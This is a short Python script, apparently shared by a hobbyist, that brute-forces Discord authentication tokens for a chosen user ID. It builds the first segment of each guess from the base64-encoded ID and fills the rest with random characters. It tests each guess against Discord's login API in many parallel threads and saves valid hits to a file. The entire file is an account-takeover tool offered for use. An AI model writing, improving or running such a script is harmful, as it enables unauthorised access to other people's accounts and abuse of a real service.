import base64
import threading
import random
import string
import requests
import time
import colorama
from colorama import Fore
colorama.init()

############## i love skids 

print(F"{Fore.BLUE}Created by epicnftmaker")
time.sleep(2)
print(F"{Fore.BLUE}this has a very small chance of working and also make a hits.txt file in the same place where this file is")
time.sleep(2)

idtoken = base64.b64encode((input("ID ---> ")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
thrd =  input("Threads -> ")

def tokenstuff():
    while idtoken == idtoken:
        token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(F"{Fore.GREEN}[!] wtf u got a vaild one GG" + ' ' + token)
                print(" ")
                file = open('hits.txt', "a+")
                file.write(F'{token}\n')
        else:
                print(F"{Fore.RED}[!] invaild" + ' ' + token)
                print(" ")

threads = []

for _ in range(int(thrd)):
    t = threading.Thread(target=tokenstuff)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()